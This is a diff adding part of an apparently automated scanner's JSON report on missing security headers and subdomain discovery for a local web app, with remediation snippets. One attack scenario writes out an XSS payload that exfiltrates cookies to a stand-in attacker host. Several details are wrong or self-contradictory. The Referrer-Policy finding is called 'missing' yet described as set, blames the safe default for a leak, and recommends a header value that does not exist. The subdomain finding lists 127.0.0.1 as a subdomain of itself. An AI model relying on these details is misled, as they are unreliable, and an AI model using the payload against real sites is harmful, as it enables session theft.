+        "Add the header `X-Frame-Options: DENY` (most restrictive) or `SAMEORIGIN` if you legitimately embed your own pages in frames.",
+        "Prefer the modern equivalent: Content-Security-Policy with `frame-ancestors 'none'` or `frame-ancestors 'self'`. CSP frame-ancestors supersedes X-Frame-Options in all modern browsers.",
+        "Combine with a same-origin check on every state-changing form: if the request's Origin or Referer does not match your application, reject it (defense in depth against CSRF)."
+      ],
+      "cwe": [
+        "CWE-1021"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker hosts a page at https://evil.example with an invisible iframe pointing to https://target.example/account/settings\n2. The iframe is styled with opacity:0.001 and overlaid with a decoy UI such as a fake captcha or 'Watch Video' button\n3. Victim visits https://evil.example while logged into target.example in the same browser\n4. Victim clicks what appears to be 'Watch Video' but is actually the 'Delete Account' button underneath\n5. The destructive action executes in the victim's authenticated session and the victim never sees anything wrong",
+      "code_examples": {
+        "nginx": "add_header X-Frame-Options \"SAMEORIGIN\" always;",
+        "apache": "Header always set X-Frame-Options \"SAMEORIGIN\"",
+        "express": "app.use((req, res, next) => {\n  res.setHeader('X-Frame-Options', 'SAMEORIGIN');\n  next();\n});",
+        "flask": "from flask import Flask\napp = Flask(__name__)\n@app.after_request\ndef set_xfo(resp):\n    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\n    return resp",
+        "django": "# settings.py \u2014 use django-security or set in middleware:\nSECURE_CONTENT_TYPE_NOSNIFF = True\nX_FRAME_OPTIONS = 'SAMEORIGIN'  # django >= 4.0\n# Or install django-security and add:\n# 'security.middleware.XFrameOptionsMiddleware'"
+      },
+      "discovered_at": "2026-08-31T22:06:59.596209Z"
+    },
+    {
+      "id": "WPOC-983F39",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing X-Content-Type-Options Header",
+      "severity": "low",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "x-content-type-options",
+      "input_used": "(not set)",
+      "summary": "The X-Content-Type-Options header is not set, allowing browsers to perform MIME-sniffing on responses. A text/plain response that the server intended as harmless text could be reinterpreted by the browser as HTML or JavaScript, enabling stored XSS even on endpoints that carefully set Content-Type.",
+      "technical_explanation": "Browsers perform 'MIME sniffing' to guess the actual content type when the declared Content-Type is missing, generic (text/plain), or inconsistent with the response body. An attacker who can upload or store content via a text-typed endpoint can craft a payload that sniffs as HTML and executes scripts in the application's origin. Setting `X-Content-Type-Options: nosniff` instructs the browser to strictly honor the declared Content-Type and refuse to sniff.",
+      "impact": "Stored XSS via MIME confusion \u2014 bypasses many application-level defenses because the developer believes the endpoint is 'just text'. Combined with a permissive CORS or same-origin XHR, attackers can read or modify sensitive data within the application's origin.",
+      "evidence_ids": [
+        "EV-6b144fd3"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Add `X-Content-Type-Options: nosniff` to every response that serves user-controlled or untrusted content.",
+        "Audit upload endpoints to ensure the server-supplied Content-Type matches the actual content (or set Content-Disposition to force download).",
+        "Pair with a strong Content-Security-Policy so that even if a sniffing bypass succeeds, the inline script cannot run."
+      ],
+      "cwe": [
+        "CWE-693"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Application accepts user-uploaded text and stores it; serves it back with `Content-Type: text/plain`\n2. Attacker uploads a payload that begins with HTML (e.g. `<script>fetch('//evil.example/?c='+document.cookie)</script>`)\n3. Victim views the page; without nosniff the browser sniffs the body as HTML and executes the script\n4. Attacker's script runs in the application's origin and exfiltrates cookies or makes credentialed requests\n5. With `nosniff`, the browser would render the response as plaintext and the script would never execute",
+      "code_examples": {
+        "nginx": "add_header X-Content-Type-Options \"nosniff\" always;",
+        "apache": "Header always set X-Content-Type-Options \"nosniff\"",
+        "express": "app.use((req, res, next) => {\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  next();\n});",
+        "flask": "@app.after_request\ndef nosniff(resp):\n    resp.headers['X-Content-Type-Options'] = 'nosniff'\n    return resp",
+        "django": "SECURE_CONTENT_TYPE_NOSNIFF = True  # in settings.py"
+      },
+      "discovered_at": "2026-08-31T22:06:59.608066Z"
+    },
+    {
+      "id": "WPOC-D36C95",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing Strict-Transport-Security Header",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "strict-transport-security",
+      "input_used": "(not set)",
+      "summary": "The Strict-Transport-Security header is not set, so browsers will not enforce HTTPS for this domain. A network attacker on the same Wi-Fi, performing a man-in-the-middle attack, can intercept the first request to the site and serve HTTP content, capture session cookies, or inject content.",
+      "technical_explanation": "HSTS tells the browser: 'for this domain, never speak HTTP \u2014 always use HTTPS for the next N seconds.' On the first visit, the browser sees the HSTS header on an HTTPS response and pins the policy for `max-age` seconds. On subsequent visits, even if the user types `http://` or clicks an `http://` link, the browser silently upgrades to HTTPS before issuing the request. Without HSTS, an attacker who intercepts the very first request \u2014 or any request after the policy expires \u2014 can serve content over HTTP, strip TLS, or redirect to a phishing site. This is the classic sslstrip attack vector.",
+      "impact": "Credential theft via sslstrip, session hijacking, and forced downgrade to plaintext HTTP. Particularly damaging for sites that set session cookies without the Secure flag \u2014 those cookies leak in plaintext over the intercepted HTTP. HSTS also protects against cookie theft via misconfigured TLS terminators and stray http:// links in legacy systems.",
+      "evidence_ids": [
+        "EV-30b9e3a7"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to every HTTPS response.",
+        "`max-age` of at least 1 year (31536000) is recommended; less than 6 months is flagged by security headers scanners.",
+        "Submit your domain to the HSTS preload list (https://hstspreload.org) so the policy is baked into browsers before the first visit.",
+        "Ensure all subdomains serve HTTPS \u2014 `includeSubDomains` is dangerous if any subdomain is HTTP-only."
+      ],
+      "cwe": [
+        "CWE-319"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Victim joins coffee-shop Wi-Fi. Attacker on same network runs an ARP-spoofing / sslstrip tool\n2. Victim types `target.example` in the address bar \u2014 no scheme, browser tries HTTP first\n3. Attacker intercepts the plaintext HTTP request, strips the redirect-to-HTTPS, and proxies to the real site over HTTPS while serving an HTTP response to the victim\n4. Victim logs in: attacker captures credentials or session cookies in plaintext\n5. With HSTS `max-age=31536000` set on a previous session, the browser would have refused the HTTP request and upgraded to HTTPS before any attacker-controlled hop",
+      "code_examples": {
+        "nginx": "add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;",
+        "apache": "Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"",
+        "express": "app.use((req, res, next) => {\n  res.setHeader(\n    'Strict-Transport-Security',\n    'max-age=31536000; includeSubDomains; preload'\n  );\n  next();\n});",
+        "flask": "from flask_talisman import Talisman\nTalisman(app, strict_transport_security=True, strict_transport_security_max_age=31536000, strict_transport_security_include_subdomains=True, strict_transport_security_preload=True)",
+        "django": "# settings.py\nSECURE_HSTS_SECONDS = 31536000\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True\nSECURE_HSTS_PRELOAD = True\n# Requires SECURE_SSL_REDIRECT = True and SECURE_PROXY_SSL_HEADER"
+      },
+      "discovered_at": "2026-08-31T22:06:59.619477Z"
+    },
+    {
+      "id": "WPOC-7D85A3",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing Referrer-Policy Header",
+      "severity": "low",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "referrer-policy",
+      "input_used": "(not set)",
+      "summary": "The Referrer-Policy header is set to `unsafe-url` or `no-referrer-when-downgrade`, allowing the browser to send the full URL of the current page (including path and query parameters) to any external site the user navigates to. Query parameters often contain session tokens, search terms, or other sensitive data.",
+      "technical_explanation": "When a user clicks an outbound link or loads an external resource, the browser sends the Referer header \u2014 the URL of the current page. `unsafe-url` sends the full URL regardless of protocol. `no-referrer-when-downgrade` sends the full URL to any destination as long as the destination is HTTPS (or HTTP, matching the source). Both leak sensitive path/query information. Safer values are `strict-origin-when-cross-origin` (default in modern browsers), `same-origin` (only same-origin requests get the full URL), or `no-referrer` (never send).",
+      "impact": "Leakage of sensitive URL parameters (password reset tokens, internal search queries, file paths, debug flags) to any external destination the user visits. Many analytics platforms, ad networks, and partner sites collect Referer headers as a matter of routine \u2014 the data spreads quickly beyond your control.",
+      "evidence_ids": [
+        "EV-a9db8652"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Set `Referrer-Policy: strict-origin-when-cross-origin` (modern default) or stricter: `same-origin`, `no-referrer`, or `same-origin-strict-origin`.",
+        "Avoid putting secrets in URLs altogether \u2014 use POST bodies for sensitive state.",
+        "Audit existing usage of `unsafe-url` and `no-referrer-when-downgrade` in legacy configurations."
+      ],
+      "cwe": [
+        "CWE-693"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Application uses URL parameters to pass state, e.g. `/reset-password?token=abc123`\n2. Application does not set Referrer-Policy, so the browser defaults to `strict-origin-when-cross-origin` (or worse, an unsafe value)\n3. Victim loads the page, then clicks an outbound link to any third-party site (a forum, a help doc, etc.)\n4. The third-party site receives `Referer: https://target.example/reset-password?token=abc123`\n5. If the third party is malicious or compromised, the reset token is now in the access logs",
+      "code_examples": {
+        "nginx": "add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;",
+        "apache": "Header always set Referrer-Policy \"strict-origin-when-cross-origin\"",
+        "express": "app.use((req, res, next) => {\n  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n  next();\n});",
+        "flask": "@app.after_request\ndef set_rp(resp):\n    resp.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'\n    return resp",
+        "django": "SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'"
+      },
+      "discovered_at": "2026-08-31T22:06:59.630715Z"
+    },
+    {
+      "id": "WPOC-C9BD15",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing Permissions-Policy Header",
+      "severity": "low",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "permissions-policy",
+      "input_used": "(not set)",
+      "summary": "The Permissions-Policy header is not set, allowing all embedded iframes, scripts, and images full access to powerful browser APIs such as camera, microphone, geolocation, and USB. While the policy is opt-in rather than blocking, its absence means a third-party script can quietly request access without your site's consent.",
+      "technical_explanation": "Permissions-Policy (formerly Feature-Policy) is a response header that lets a site declare which browser features are allowed for the page and for any embedded content. Examples: `camera=(), microphone=(), geolocation=(self), usb=()`. When absent, the browser default is to permit everything. A third-party analytics script or ad tag can request `navigator.mediaDevices.getUserMedia()` without the host page's explicit policy, and the browser will prompt the user (or silently allow in some legacy contexts).",
+      "impact": "Reduced control over which browser features are exposed to first-party code, embedded iframes, and third-party scripts. Particularly relevant for sites serving content from ad networks, embedded videos, or chat widgets. Defense in depth: if a third-party tag is compromised, Permissions-Policy limits the blast radius.",
+      "evidence_ids": [
+        "EV-72d4c02a"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Add a Permissions-Policy header that disables features you do not use: `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=()`. Allow specific origins only for the features you need: `geolocation=(self)`.",
+        "Audit embedded third-party scripts and tags; tighten policies to limit what each embedded origin can do.",
+        "Test changes incrementally \u2014 some legacy code may rely on a feature you decide to disable."
+      ],
+      "cwe": [
+        "CWE-693"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Application includes a third-party analytics script (analytics.example.com)\n2. analytics.example.com is compromised or rebranded into a malicious network\n3. Malicious script calls `navigator.geolocation.getCurrentPosition()` and exfiltrates the user's coordinates\n4. Or calls `navigator.usb.requestDevice()` to enumerate connected USB devices\n5. With `Permissions-Policy: geolocation=(), camera=()` set, the browser blocks these APIs entirely for the page and any embedded content",
+      "code_examples": {
+        "nginx": "add_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), usb=()\" always;",
+        "apache": "Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"",
+        "express": "app.use((req, res, next) => {\n  res.setHeader(\n    'Permissions-Policy',\n    'camera=(), microphone=(), geolocation=()'\n  );\n  next();\n});",
+        "flask": "@app.after_request\ndef set_pp(resp):\n    resp.headers['Permissions-Policy'] = 'camera=(), microphone=()'\n    return resp",
+        "django": "# No built-in setting; use middleware:\nresponse['Permissions-Policy'] = 'camera=(), microphone=()'"
+      },
+      "discovered_at": "2026-08-31T22:06:59.642457Z"
+    },
+    {
+      "id": "WPOC-64D77C",
+      "check": {
+        "id": "subdomain-finder",
+        "name": "Subdomain Finder",
+        "version": "0.1.0",
+        "category": "discovery"
+      },
+      "title": "Subdomain Discovered: 127.0.0.1",
+      "severity": "info",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "scheme": "https",
+        "endpoint": "/",
+        "method": "HEAD"
+      },
+      "input_used": "127.0.0.1",
+      "summary": "Discovered subdomain '127.0.0.1' of '127.0.0.1' while crawling the site. The crawler visited 9 page(s) and inspected 11 URL(s); '127.0.0.1' was referenced by one of those URLs.",
+      "technical_explanation": "Root domain: 127.0.0.1. Discovery source: crawl. Hostname observed: 127.0.0.1.",
+      "impact": "Each discovered subdomain expands the attack surface of the target organization. Subdomains sometimes run outdated software, dev/staging tools, or admin panels with weaker controls than the production site. Even passive discovery (DNS lookup or HEAD probe) is enough to enumerate the surface for follow-up review.",
+      "evidence_ids": [
+        "EV-3588db3f"
+      ],
+      "reproduction": [
+        {
+          "step": 1,
+          "description": "Issue HEAD https://127.0.0.1/ \u2014 expect a 2xx/3xx response (proves the host is alive).",
+          "request": "curl -X HEAD https://127.0.0.1/"
+        },
+        {
+          "step": 2,
+          "description": "Confirm the hostname is a subdomain of the target via DNS: dig +short 127.0.0.1",
+          "request": "dig +short 127.0.0.1"
+        }
+      ],
+      "remediation": [
+        "Maintain an authoritative inventory of all subdomains and decommission anything not actively used.",
+        "Apply the same hardening (HTTPS, headers, auth) to every subdomain, including dev/staging environments.",
+        "Use DNS zone files and certificate-transparency logs to detect subdomain takeover risk before an attacker does."
+      ],
+      "cwe": [],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [
+        "https://owasp.org/www-project-attack-surface-management/"
+      ],
+      "code_examples": {},
+      "discovered_at": "2026-08-31T22:07:11.417266Z",
+      "fingerprint": "dd2c17f96541d178"
+    }
+  ]
+}
